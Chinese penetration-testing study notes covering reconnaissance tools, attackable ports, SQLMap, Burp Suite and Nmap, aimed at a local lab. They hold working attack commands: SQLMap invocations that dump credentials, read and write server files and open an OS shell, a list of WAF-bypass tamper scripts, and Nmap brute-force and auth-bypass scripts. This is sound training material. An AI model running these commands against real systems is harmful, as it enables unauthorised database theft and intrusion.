Web安全攻防

## 渗透测试之信息收集



### 收集字段&对应工具

| 字段            | 工具                                                         |
| --------------- | ------------------------------------------------------------ |
| IP地址          | nslookup，[站长之家IP查询](http://ip.tool.chinaz.com/)       |
| 端口            | nmap，[masscan](https://github.com/robertdavidgraham/masscan)，[Shodan](https://www.shodan.io/) |
| 可疑文件/目录   | [dirsearsh](https://github.com/maurosoria/dirsearch.git)     |
| CMS指纹信息     | [云悉](https://www.yunsee.cn/)，[潮汐指纹](http://finger.tidesec.net/)，[ThreatScan](https://scan.top15.cn/web/) |
| 历史漏洞        | [乌云漏洞库](https://wooyun.x10sec.org/)                     |
| Whois查询       | [站长工具whois](http://whois.chinaz.com/)，[爱站](https://www.aizhan.com/) |
| ICP备案信息查询 | [ICP备案查询网](https://beian.miit.gov.cn/#/Integrated/recordQuery)，天眼查 |
| 子域名信息      | [one for all](https://github.com/shmilylty/OneForAll.git)    |
| 综合工具        | [资产灯塔管理系统（ARL）](https://github.com/hkylin/ARL)，[Goby（半自动档）](https://gobies.org/) |



### 常见端口

#### 文件共享服务

| 端口号   | 端口说明             | 攻击方向                           |
| -------- | -------------------- | ---------------------------------- |
| 21/22/69 | Ftp/Tftp文件传输协议 | 允许匿名的上传、下载、爆破和探操作 |
| 2049     | Nfs服务              | 配置不当                           |
| 139      | Samba服务            | 爆破、未授权访问、远程代码执行     |
| 389      | Ldap日录访问协议     | 注入、允许匿名访问、弱口令         |

#### 远程连接服务

| 端口号 | 端口说明        | 攻击方向                                             |
| ------ | --------------- | ---------------------------------------------------- |
| 22     | SSH远程连接     | 爆破、SSH隧道及内网代理转发、文件传输                |
| 23     | Telnet远程连接  | 爆破、嗅探、弱口令                                   |
| 3389   | Rdp远程桌面连接 | Shift后门（需要 Windows Server2003以下的系统）、爆破 |
| 5900   | VNC             | 弱口令爆破                                           |
| 5632   | PyAnywhere服务  | 抓密码、代码执行                                     |

#### Web应用服务端口

| 端口号      | 端口说明                  | 攻击方向                          |
| ----------- | ------------------------- | --------------------------------- |
| 80/443/8080 | 常见的Web服务端口         | Web攻击、爆破、对应服务器版本漏洞 |
| 7001/7002   | WebLogic控制台            | Java反序列化、弱口令              |
| 8080/8089   | Jboss/Resin/Jetty/Jenkins | 反序列化、控制台弱口令            |
| 9090        | WebSphere控制台           | Java反序列化、弱口令              |
| 4848        | GlassFish控制台           | 弱口令                            |
| 1352        | Lotus domino邮件服务      | 弱口令、信息泄露、爆破            |
| 10000       | Webmin-Web控制面板        | 弱口令                            |

#### 数据库服务端口

| 端口号      | 端口说明          | 攻击方向                     |
| ----------- | ----------------- | ---------------------------- |
| 3306        | MySQL             | 注入、提权、爆破             |
| 1433        | MSSQL数据库       | 注入、提权、SA弱口令、爆破   |
| 1521        | Oracle数据库      | TNS爆破、注入、反弹 Shell    |
| 5432        | PostgreSQL数据库  | 爆破、注入、弱口令           |
| 27017/27018 | MongoDB           | 爆破、未授权访问             |
| 6379        | Redis数据库       | 可尝试未授权访间、弱口令爆破 |
| 5000        | SysBase/DB2数据库 | 爆破、注入                   |

#### 邮件服务端口

| 端口号 | 端口说明     | 攻击方向   |
| ------ | ------------ | ---------- |
| 25     | SMTP邮件服务 | 邮件伪造   |
| 110    | POP3协议     | 爆破、嗅探 |
| 143    | IMAP协议     | 爆破       |

#### 网络常见协议端口

| 端口号 | 端口说明    | 攻击方向                              |
| ------ | ----------- | ------------------------------------- |
| 53     | DNS域名系统 | 允许区域传送、DNS劫持、缓存投毒、欺骗 |
| 67/68  | DHCP服务    | 劫持、欺编                            |
| 161    | SNMP协议    | 爆破、搜集目标内网信息                |

#### 特殊服务端口

| 端口号      | 端口说明               | 攻击方向            |
| ----------- | ---------------------- | ------------------- |
| 2181        | Zookeeper服务          | 未授权访问          |
| 8069        | Zabbix服务             | 远程执行、SOL注入   |
| 9200/9300   | Elasticsearch服务      | 远程执行            |
| 11211       | Memcache服务           | 未授权访问          |
| 512/513/514 | Linux Rexec服务        | 爆破、 Rlogin登录   |
| 873         | Rsync服务              | 匿名访问、文件上传  |
| 3690        | Svn服务                | Svn泄露、未授权访问 |
| 50000       | SAP Management Console | 远程执行            |



## 搭建漏洞环境

















## 常见的渗透测试工具使用

### SQLMap

​		支持的数据库是MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase和SAP MAXDB。

> 超详细SQLMap使用攻略及技巧分享：https://www.freebuf.com/sectool/164608.html
>
> sqlmap超详细使用说明书：https://blog.csdn.net/qq_46432288/article/details/109403919
>



#### 5种SQL注入技术

- 基于布尔类型的盲注：根据返回页面判断条件真假的注入；
- 基于时间的盲注：根据时间延迟语句是否已执行（即页面返回时间是否增加）来判断；
- 基于报错注入：利用注入错误信息，把注入的语句的结果直接返回；
- 联合查询注入：在可以使用Union的情况下的注入；
- 堆査询注入：可以同时执行多条语句时的注入。

#### SQLMap基础命令

1. **判断是否存在注入**

   ```
   python2 sqlmap.py -u http://192.168.163.132:2334/Less-1/?id=1
   ```

   注意：当注入点后面的参数大于两个时，需要加双引号

   ```
   python2 sqlmap.py -u "http://192.168.163.132:2334/Less-1/?id=1&uid=2"
   ```

   ![image-20210312140034038](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210312140034038.png)

   

2. **判断文本中的请求是否存在注入**

   SQLMap可以从文件中加载HTTP请求，这样就可以不设置其他参数(如 cookie、POST数据等)，txt文件中的内容为Web数据包。

   例如这个demo1.txt文件就可用作文本请求：

   ![image-20210312135845867](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210312135845867.png)

   **-r一般在cookie注入时使用：**

   ```
   python2 sqlmap.py -r demo1.txt
   ```

   

3. **查询当前用户下的所有数据库**

   该命令是确定网站存在注入后，用于查询当前用户下的所有数据库；

   如果当前用户**有权限读取**包含所有数据库列表信息的表，使用该命令就可以列出**所有数据库**。

   ```
   python2 sqlmap.py -u http://192.168.163.132:2334/Less-1/?id=1 --dbs
   ```

   ![image-20210312141151239](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210312141151239.png)

   

4. **获取数据库中的表名**

   该命令的作用是查询完数据库后，查询指定数据库中所有的表名；

   如果在该命令中不加入-D参数来指定某一个具体的数据库，那么SQLMap会列出数据库中所有库的表；

   ```
   python2 sqlmap.py -u "http://192.168.163.132:2334/Less-1/?id=1" -D security --tables
   ```

   ![image-20210312141620293](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210312141620293.png)

   

5. **获取表中的字段名**

   该命令的作用是查询完表名后，查询该表中所有的字段名；

   ```
   python2 sqlmap.py -u "http://192.168.163.132:2334/Less-1/?id=1" -D security -T users --columns
   ```

   ![image-20210312141941246](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210312141941246.png)

   

6. **获取字段内容**

   该命令是查询完字段名之后，获取该字段中具体的数据信息；

   需要的字段可以根据自己的需要自行选择

   ```
   python2 sqlmap.py -u "http://192.168.163.132:2334/Less-1/?id=1" -D security -T users -C id,username,password --dump
   ```

   ![image-20210312142423805](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210312142423805.png)

   

7. **获取数据库的所有用户**

   该命令的作用是列出数据库的所有用户；

   在当前用户有权限读取包含所有用户的表的权限时，使用该命令就可以列出所有管理用户

   ```
   python2 sqlmap.py -u "http://192.168.163.132:2334/Less-1/?id=1" --users
   ```

   ![image-20210312142818760](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210312142818760.png)

   

8. **获取数据库用户的密码**

   该命令的作用是列出数据库用户的密码。如果当前用户有读取用户密码的权限，SQLMap会先列举出用户，然后列出Hash,并尝试破解。

   ```
   python2 sqlmap.py -u "http://192.168.163.132:2334/Less-1/?id=1" --passwords
   ```

   如果密码使用MySQL5加密，，我们可以在https://www.cmd5.com/中进行解密

   

9. **获取当前网站数据库的名称**

   使用该命令可以列出当前网站使用的数据库

   ```
   python2 sqlmap.py -u "http://192.168.163.132:2334/Less-1/?id=1" --current-db
   ```

   ![image-20210312143602162](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210312143602162.png)

   

10. **获取当前网站数据库的用户名称**

    使用该命令可以列出当前网站使用的数据库用户

    ```
    python2 sqlmap.py -u "http://192.168.163.132:2334/Less-1/?id=1" --current-user
    ```

    ![image-20210312143735707](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210312143735707.png)



#### SQLMap进阶

1. **–level5 测试等级**

   可添加测试等级参数，从1级到5级（默认为1），SQLMap使用的Payload在下`/data/xml/payloads.xml`中看到，也可以添加自己的Payload；

   其中5级payload最多，会自动破解出cookie、XFF等头部注入，但是运行速度比较慢！

   HTTP，cookie在level为2时就会测试，HTTP，User-agent/Referer头在level为3时就会测试。

   ```
   python2 sqlmap.py -u http://192.168.163.132:2334/Less-20/?id=1 --level 5
   ```

   ![image-20210312151326519](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210312151326519.png)

   

2. **–is-dba 当前用户是否为管理权限**

   该命令用于查看当前账户是否为数据库管理员账户，例如会返回Ture

   ```
   python2 sqlmap.py -u http://192.168.163.132:2334/Less-1/?id=1 --is-dba
   ```

   ![image-20210312151833945](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210312151833945.png)

   

3. **–roles 列出数据库管理员角色**

   该命令用于查看数据库用户的角色

   如果当前用户有权限读取包含所有用户的表，输入该命令会列举出每个用户的角色，也可以用-U参数指定想看哪个用户的角色。该命令仅适用于当前数据库是Oracle的时候

   下图就是查看数据库角色

   ```
   python2 sqlmap.py -u http://192.168.163.132:2334/Less-1/?id=1 --roles
   ```

   查看数据库角色：

   ![image-20210312152220081](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210312152220081.png)

   

4. **–referer HTTP Refere头**

   SQLMap可以在请求中伪造HHTP中的referer，当--level参数设定为3或3以上时，就会尝试对referer注入。

   也可以直接使用referer命令来欺骗

   ```
   python2 sqlmap.py -u http://192.168.163.132:2334/Less-1/?id=1 --referer http://www.baidu.com
   ```

   ![image-20210312153114276](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210312153114276.png)

   > HTTP Referer是header的一部分，它告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。

   

5. **–sql-shell 运行自定义SQL语句**

   该命令用于执行指定的SQL语句，例如需要执行`select * from users limit 0,1`，先启动SQLMap模式

   ```
   python2 sqlmap.py -u http://192.168.163.132:2334/Less-1/?id=1 --sql-shell
   ```

   ![image-20210312153427382](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210312153427382.png)

   

6. **–os-cmd，–os-shell 运行任意操作系统命令**

   在数据库为MySQL、PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数时可以使用。

   ![image-20210312155631859](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210312155631859.png)

   使用这个参数可以模拟一个真实的Shell，输入想执行的命令。当不能执行多语句时(比如PHP或ASP的后端数据库为MySQL)，仍然可以使用INTO OUTFILE写进可写目录，创建一个Web后门

   `–os-shell`支持ASP、ASPNET、JSP和PHP(默认为PHP)四种语言

   ```
   python2 sqlmap.py -u http://192.168.163.132:2334/Less-1/?id=1 --os-shell
   ```

   输入后根据需要进行语言的选择

   ![image-20210312160536472](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210312160536472.png)

   继续Y执行

   ![image-20210312161005465](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210312161005465.png)

   这里需要我们选择网站的绝对路径，这里不再演示了

   其他的我们可以参考这篇文章：https://blog.csdn.net/weixin_30851409/article/details/98443870

   > xp_cmdshell：扩展存储过程将命令字符串作为操作系统命令 shell 执行，并以文本行的形式返回所有输出。
   >
   > 由于存在安全隐患，所以在SQL Server 2005中，xp_cmdshell 默认是关闭的。但SQLMap会重新启用，如果不存在，会自动创建。

7. **–file-read 从数据库服务器中读取文件**

   该命令用于读取执行文件，当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数时，读取的文件可以是文本，也可以是二进制文件。

   ```
   python2 sqlmap.py -u http://192.168.163.132:2334/Less-1/?id=1 --file-read "路径" -v 1
   ```

   

8. **–file-write–file-dest 上传文件到数据库服务器中**

   该命令用于写入本地文件到服务器中，当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数时，上传的文件可以是文本，也可以是二进制文件。

   ```
   python2 sqlmap.py -u http://192.168.163.132:2334/Less-1/?id=1 --file-write "路径" --file-dest "路径" -v 1
   ```



#### SQLMap使用指定方式注入

参数：`--technique`，这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式

B: 基于布尔型的盲注（Boolean based blind）
Q: 内联型查询（inlin queries）
T: 基于时间的盲注（time based blind）
U: 可联合查询注入（union query based）
E: 报错型注入（error based）
S: 栈查询（stack queries）



#### SQLMap自带绕过脚本tamper的讲解

SQLMap在默认情况下除了使用 CHAR() 函数防止出现单引号，没有对注入的数据进行修改，我们可以使用**tamper参数**对数据进行修改来**绕过WAF等设备**

其中大部分脚本主要用**正则模块替换攻击载荷字符编码的方式尝试绕过WAF的检测规则**，目前官方提供了60多个绕过脚本，使用命令如下所示

```
python2 sqlmap.py XXXXX --tamper "模块名"
```



**常用的tamper脚本**

| tamper脚本                   | 作用                                                         |
| ---------------------------- | ------------------------------------------------------------ |
| apostrophemask.py            | 将引号替换为UTF-8，用于过滤单引号                            |
| base64encode.py              | 替换为base64编码                                             |
| multiplespaces.py            | 围绕SQL关键字添加多个空格                                    |
| space2plus.py                | 用 + 号替换空格                                              |
| nonrecursivereplacement.py   | 作为双重查询语句，用双重语句替代预定义的SQL关键字（适用于非常弱的自定义过滤器，例如将 SELECT 替换为空） |
| space2randomblank.py         | 将空格替换为其他有效字符                                     |
| unionalltounion.py           | 将 UNION ALL SELECT替换为 UNION SELECT                       |
| securesphere.py              | 追加特制的字符串                                             |
| space2hash.py                | 将空格替换为 # 号，并添加一个随机字符串和换行符              |
| space2mssqlblank.py（mssql） | 将空格替换为其他空符号                                       |
| space2mssglhash.py           | 将空格替换为 # 号，并添加一个换行符                          |
| between.py                   | 用 NOT BETWEEN O AND替换大于号(>),用 BETWEEN AND替换等号(=)  |
| percentage.py                | ASP允许在每个字符前面添加个%号                               |
| sp_password.py               | 从DBMS日志的自动模糊处理的有效载荷中追加sp_password          |
| charencode.py                | 对给定的Payloads全部字符使用URL编码（不处理已经编码的字符）  |
| charunicodeencode.py         | 用unicode编码字符串                                          |
| spacezcomment.py             | 将空格替换为体/**/                                           |
| equaltollke.py               | 将等号替换为like                                             |
| greatest.py                  | 绕过对 > 的过滤，用GREATESTT替换大于号                       |
| ifnull2ifisnul.py            | 绕过对 FNULLB 的过滤                                         |
| modsecurityversioned.py      | 过滤空格，使用MySQL内联注释的方式进行注入                    |
| space2mysqlblank.py          | 将空格替换为其他空白符号（适用于MySQL）                      |
| modsecurityzeroversioned.py  | 使用MySQL内联注释的方式(/\*!00000*/)进行注入                 |
| space2mysqldash.py           | 将空格替换为——，并添加一个换行符                             |
| bluecoat.py                  | 在SQL语句之后用有效的随机空白符替换空格符，随后用LIKE替换等于号(=) |
| versionedkeyworas.py         | 注释绕过                                                     |
| halfversionedmorekeywords.py | 当数据库为MYSQLE时绕过防火墙，在每个关键字之前添加MySQL版本注释 |
| space2morehash.py            | 将空格替换为#号，并添加一个随机字符串和换行符                |
| apostrophenullencode.py      | 用非法双字节unicode字符替换单引号                            |
| appendnullbyte.py            | 在有效负荷的结束位置加载零字节字符编码                       |
| chardoubleencode.py          | 对给定的Payload全部字符使用双重URL编码（不处理已经编码的字符） |
| unmaglcquotes.py             | 用个多字节组合(%bf%27)和末尾通用注释一起替换空格             |
| randomcomments.py            | 用/**/分割SQL关键字                                          |



### Burp Suite

​		Burp Suited代理工具是一款**拦截代理**的集成化的渗透测试工具，可以拦截所有通过代理的网络流量。它可以以中间人的方式对客户端的请求数据、服务端的返回信息做各种处理，以达到安全测试的目的。

#### Burp Suite基础

1. **Proxy**

   核心功能，通过代理收集数据包

   - Forward：表示将拦截的数据包或修改后的数据包发送至服务器端
   - Drop：表示丢弃当前拦截的数据包
   - Interception is on：开启拦截功能
   - Action：可以将数据包进一步发送到其他工具页面

   

   同时Burp有四种消息类型显示数据包

   - Raw：主要显示Web请求的raw格式，以纯文本的形式显示数据包各种内容
   - Params：主要显示客户端请求的参数信息，包括GET或者POST请求的参数、cookie参数
   - Headers：显示数据包中的头信息，以名称、值的形式显示数据包
   - Hex：对应的是Raw中信息的二进制内容，可以通过Hex编辑器对请求的内容进行修改，在进行00截断时非常好用

   ![image-20210312202342040](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210312202342040.png)

   

2. **Spider**

   蜘蛛爬虫，爬取目标系统结构

   ![image-20210312203118912](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210312203118912.png)

   

3. **Decoder**

   编解码工具

   ![image-20210312202502049](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210312202502049.png)



#### Burp Suite进阶

##### Scanner

Burp Scanner主要用于自动检测Web系统的各种漏洞

1. **扫描生成报告**

   选择生成html文件，就可以得到扫描后的报告

   ![image-20210312203655923](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210312203655923.png)

   报告内容

   ![image-20210312203824067](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210312203824067.png)

   

2. **主动扫描**

   当使用主动扫描模式时，Burp会向应用发送新的请求并通过Payload验证漏洞。由于会产生泛洪请求，所以会直接影响服务端性能，**通常用于非生产环境**。

   主动扫描适用于以下这两类漏洞

   - 客户端的漏洞：如XSS、HTTP头注入、操作重定向
   - 服务端的漏洞：如SQL注入、命令行注入、文件遍历

   

3. **被动扫描**

   当使用被动扫描模式时，Burp不会重新发送新的请求，只是对已经存在的请求和应答进行分析，因此不会对服务器产生较大负荷，减低了测试风险，**通常适用于生产环境的检测**。

   下列漏洞在被动模式中容易被检测出来：

   - 提交的密码为未加密的明文
   - 不安全的cookie的属性，例如缺少HttpOnly和安全标志
   - cookie的范围缺失
   - 跨域脚本包含和站点引用泄露
   - 表单值自动填充，尤其是密码
   - SSL保护的内容缓存
   - 目录列表
   - 提交密码后应答延迟
   - session令牌的不安全传输
   - 敏感信息泄露，例如内部IP地址、电子邮件地址、堆栈跟踪等信息泄露
   - 不安全的ViewState的配置
   - 错误或不规范的Content-Type指令



##### Intruder

Intruder是一个定制化工具，可针对不同的目标进行**爆破测试**，比如爆破用户名，密码，模糊测试，SQL注入，跨站，目录遍历等

1. 第一步设置爆破位置

   ![image-20210312212353910](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210312212353910.png)

2. 选择爆破的方式

   ![image-20210312212839087](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210312212839087.png)

3. 设置其他参数，这里主要设置线程数量，但线程数增大会对服务器有不小的压力

   ![image-20210312213030026](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210312213030026.png)

4. 最后开始爆破，按照长度排个序，出现长度不一样的就有可能是密码

   ![image-20210312213847666](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210312213847666.png)



##### Repeater

Burp Repeater工具可以手动修改发送包的内容，并高效的发送修改后的请求包，常与其他工具结合使用。

Repeater分析选项有4种：

- Raw：显示纯文本格式的数据包
- Params：会包含参数（URL查询字符串、Cookie头、消息体）这些参数显示为名字/值的格式显示出来
- Headers：以名字/值的格式显示HTTP的消息头
- Hex：允许直接编辑由原始二进制数据组成的数据包

![image-20210312214434809](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210312214434809.png)



##### Comparer

Burp Comparer提供一个可视化的**差异比对功能**，用于分析两次数据之间的区别，常用于：

- 爆破过程中，对比响应成功和失败之间的区别
- 进行SQL注入的盲注测试时，比较两次响应消息的差异，判断盲注是否成功

Comparer数据加载可以从：**历史数据中加载，直接粘贴，从文件加载**

![image-20210312215810232](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210312215810232.png)



### Nmap

​		Nmap用于快速扫描大型网络，包括主机探测与发现、端口开放情况、操作系统与应用服务指纹识別、WAF识别及常见安全漏洞

#### 常用参数

##### 设置扫描目标的相关参数

| 参数            | 作用                                   |
| --------------- | -------------------------------------- |
| `-iL`           | 从文件中导入目标主机或目标网段         |
| `-iR`           | 随机选择目标主机                       |
| `--exclude`     | 后面跟的主机或网段将不在扫描范围内     |
| `--excludefile` | 导入文件中的主机或网段将不在扫描范围中 |

##### 主机发现方法参数

| 参数                                           | 作用                                                    |
| ---------------------------------------------- | ------------------------------------------------------- |
| `-sL`                                          | List Scan(列表扫描)，仅列举指定目标的IP，不进行主机发现 |
| `-sn`                                          | Ping Scan，只进行主机发现，不进行端口扫描               |
| `-Pn`                                          | 将所有指定的主机视作已开启，跳过主机发现的过程          |
| `-PS/PA/PU/PY`                                 | 使用TCP SYN/ACK或SCTP INIT/ECHO方式来发现               |
| `-PE/PP/PM`                                    | 使用ICMP echo、timestamp、netmask请求包发现主机         |
| `-PO`                                          | 使用IP协议包探测对方主机是否开启                        |
| `-n/-R`                                        | `-n`表示不进行DNS解析；`-R`表示总是进行DNS解析          |
| `--dns-servers <指定DNS的IP> <需要解析的域名>` | 指定DNS服务器解析域名                                   |
| `--system-dns`                                 | 指定使用系统的DNS服务器                                 |
| `--traceroute`                                 | 追踪每个路由节点                                        |

##### 常见的端口扫描参数

| 参数                             | 作用                                                         |
| -------------------------------- | ------------------------------------------------------------ |
| `-sS/sT/sA/sW/sM`                | 指定使用TCP SYN/ Connect()/ ACK/Window/ Maimon scans的方式对目标主机进行扫描 |
| `-sU`                            | 指定使用UDP扫描的方式确定目标主机的UDP端口状况               |
| `-sN/sF/sX`                      | 指定使用 TCP Null/ FIN/ Xmas scans秘密扫描的方式协助探测对方的TCP端口状态 |
| `--scanflags <flags>`            | 定制TCP包的flags                                             |
| `-sl<zombie host [: probeport]>` | 指定使用Idle scan的方式扫描目标主机(前提是需要找到合适的 zombie host) |
| `-sY/sZ`                         | 使用SCTP INIT/ COOKIE-ECHO扫描SCTP协议端口的开放情况         |
| `-sO`                            | 使用IP protocol扫描确定目标机支持的协议类型                  |
| `-b<FTP relay host>`             | 使用FTP bounce scan扫描方式                                  |

##### 端口参数与扫描顺序的设置的参数

| 参数                         | 作用                                                         |
| ---------------------------- | ------------------------------------------------------------ |
| `-p <端口范围>`              | 扫描指定的端口，例如：-p 80，-p 20-30                        |
| `-F`                         | Fast mode（快速模式），仅扫描TOP100的端口                    |
| `-r`                         | 不进行端口随机打乱的操作，因此可能被目标的防火墙发现         |
| `--top-ports <number>`       | 扫描开放概率最高的前几个端口，默认情况大概会扫描1000个TCP端口 |
| `--port-ratio<概率>`         | 扫描指定频率以上的端口，于`--top-ports`类似，这里以概率作为参数（0~1） |
| `-sV`                        | 进行版本侦测                                                 |
| `--version-intensity <等级>` | 指定侦测的强度(0-9)，默认为7级                               |
| `--version-light`            | 指定使用轻量级侦测方式(intensity2)                           |
| `--version-all`              | 尝试使用所有的probes进行侦测(intensity9)                     |
| `--version-trace`            | 显示出详细的版本侦测过程信息                                 |



#### 常用参数组合

1. **扫描单个目标地址**

   ```
   nmap 192.168.163.136
   ```

2. **扫描多个目标地址**

   可以扫描不同网段，或者同一网段但不连续的目标

   ```
   nmap 192.168.163.2-20
   nmap 192.168.163.2 192.168.25.39
   nmap 192.168.163.2-20 192.168.25.39
   ```

3. **扫描某个网段**

   ```
   nmap 192.168.163.2/24
   
   #排除一些地址
   nmap 192.168.163.2/24 --exclude 192.168.163.1
   #排除一些地址（使用文件的方式）
   nmap 192.168.163.2/24 --excludefile 路径/targets.txt
   ```

4. **导入主机扫描列表地址文件**

   ```
   nmap -iL 路径/IPs.txt
   ```

5. **扫描目标的特定端口&服务版本检测**

   ```
   nmap 192.168.163.136 -p 21,22,23,80
   
   #查看版本信息
   nmap 192.168.163.136 -p 21,22,23,80 -sV
   ```

6. **对目标地址进行路由跟踪**

   ```
   nmap --traceroute 10.128.2.25
   ```

   ![image-20210313130100090](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210313130100090.png)

7. **扫描目标地址所在C段的在线状况**

   ```
   nmap -sP 192.168.163.2/24
   ```

8. **目标地址的操作系统指纹识别**

   ```
   nmap -O 192.168.163.136
   ```

   ![image-20210313125957371](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210313125957371.png)

9. **探测防火墙**

   在实战中，可以利用FIN扫描的方式探测防火墙的状态，收到RST回复说明该端口关闭，否则就是open或filtered状态

   ```
   nmap -sF -T4 192.168.163.136
   ```

   ![image-20210313131536032](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210313131536032.png)



#### 状态识别

Nmap可以输出的6种端口状态

| 状态            | 含义                                                   |
| --------------- | ------------------------------------------------------ |
| open            | 开放的，目标正在监听该端口，外部可以访问连接           |
| filtered        | 被过滤的，被防火墙或其他网络设各阻止，不能访问         |
| closed          | 关闭的，目标主机未开启该端口                           |
| unfiltered      | 未被过滤的，表示Nmap无法确定端口所处状态，需进一步探测 |
| open/filtered   | 开放的或被过滤的，Nmap不能识别                         |
| closed/filtered | 关闭的或被过滤的，Nmap不能识别                         |



#### Nmap进阶

##### Nmap脚本介绍

个人理解，这些Nmap的脚本是一套写好的招式“组合拳”，帮助我们套用，并快速获得所需的信息

> Nmap脚本引擎原理：https://www.cnblogs.com/liun1994/p/7041373.html
>
> 编写自己的Nmap脚本：https://www.cnblogs.com/liun1994/p/7041531.html



Nmap脚本的脚本默认在scripts/ 文件夹下，主要有以下几类：

| 类型      | 用途                                                        |
| --------- | ----------------------------------------------------------- |
| Auth      | 负责处理鉴权证书（绕过鉴权）的脚本                          |
| Broadcast | 在局域网内探查更多服务的开启情况，如DHCP/DNS等              |
| Brute     | 针对常见的应用提供暴力破解方式，如HTTP/SMTP等               |
| Default   | 使用`-sC`或`-A`选项扫描时默认的脚本，提供基本的脚本扫描能力 |
| Discovery | 对网络进行更多信息的搜集，如SMB枚举、SNMP查询等             |
| Dos       | 用于进行拒绝服务攻击                                        |
| Exploit   | 利用已知的漏洞入侵系统                                      |
| External  | 利用第三方的数据库或资源。例如，进行Whois解析               |
| Fuzzer    | 模糊测试脚本，发送异常的包到目标机，探测出潜在漏洞          |
| Intrusive | 入侵性的脚本，此类脚本可能引发对方的IDS/PS的记录或屏蔽      |
| Malware   | 探测目标机是否感染了病毒、开启后门等信息                    |
| Safe      | 此类与Intrusive相反，属于安全性脚本                         |
| Version   | 负责増强服务与版本扫描功能的脚本                            |
| Vuln      | 负责检查目标机是否有常见漏洞，如MS08-067                    |



##### Nmap脚本参数介绍

| 命令                                     | 用途                                                         |
| ---------------------------------------- | ------------------------------------------------------------ |
| `-sC/–script=default`                    | 使用默认的脚本进行扫描                                       |
| `--script=脚本名称`                      | 使用特定的脚本                                               |
| `--script-trace`                         | 查看脚本执行过程中发送与接收的数据                           |
| `--script-args=key1=value1，key2=value2` | 传递脚本所需的参数                                           |
| `-script-args-file=filename`             | 使用文件为脚本提供参数                                       |
| `--script-updatedb`                      | 在Nmap的scripts目录里有一个script.db文件，该文件保存了当前Nmap可用的脚本，类似于个小型数据库，使用参数后Nmap会自行扫描scripts目录中的扩展脚本，**进行数据库更新** |
| `--script-help`                          | 显示该脚本使用的参数                                         |



##### 常用脚本使用

1. **鉴权扫描**

   可以对目标主机或目标主机所在的网段进行应用**弱口令检测**

   ```
   nmap --script=auth 192.168.163.136
   ```

   ![image-20210313143703476](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210313143703476.png)

   

2. **暴力破解**

   可对数据库、SMB、SNMP等进行简单密码的暴力猜解

   ```
   nmap --script=brute 192.168.163.136
   ```

3. **扫描常见漏洞**

   ```
   nmap --script=vuln 192.168.163.136
   ```

   ![image-20210313144534464](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210313144534464.png)

   

4. **应用服务扫描**

   ```
   nmap --script=realvnc-auth-bypass 192.168.163.136
   ```

   ![image-20210313144623542](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210313144623542.png)

   

5. **探测局域网内更多服务开启的情况**

   ```
   nmap -n -p 445 --script=broadcast 192.168.163.136
   ```

   ![image-20210313144740891](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210313144740891.png)

   

6. **Whois解析**

   ```
   nmap -script external baidu.com
   ```

   ![image-20210313144812354](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210313144812354.png)





## Web安全原理剖析

### SQL注入

#### SQL注入基础

**SQL注入过程**

1. 寻找到SQL注入的位置
2. 判断服务器类型和后台数据库类型
3. 针对不同的服务器和数据库特点进行SQL注入攻击
   1. 获取字段数
   2. 获取数据库名
   3. 获取数据库中的表名
   4. 获取表中的字段名
   5. 获取各个字段值

**MySQL基础三表**

![image-20210313153229670](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210313153229670.png)

#### SQL注入分类

1、按变量类型分

- 数字型：向数据库传入的是数字，不带引号
- 字符型：向数据库传入的是字符，带引号
- 搜索型注入：又称文本框注入

2、按HTTP提交方式分

- GET注入：多出现于网站上的搜索
- POST注入：多出现于用户名的登录搜索匹配
- HTTP头注入
  - XFF头
  - Cookie注入
  - Host头

3、按注入方式分

- 报错注入：利用页面返回错误信息，将语句的查询结果直接返回到页面
- 盲注
